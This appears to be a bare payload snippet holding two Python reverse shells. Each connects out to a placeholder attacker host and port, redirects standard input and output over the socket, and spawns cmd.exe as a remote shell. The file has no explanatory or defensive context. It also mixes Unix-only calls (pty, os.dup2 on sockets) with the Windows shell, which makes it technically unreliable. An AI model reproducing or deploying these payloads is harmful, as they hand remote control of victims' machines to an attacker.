import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP","ATTACKER_PORT"))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["cmd.exe","/k"])

import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP","ATTACKER_PORT"))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("cmd.exe")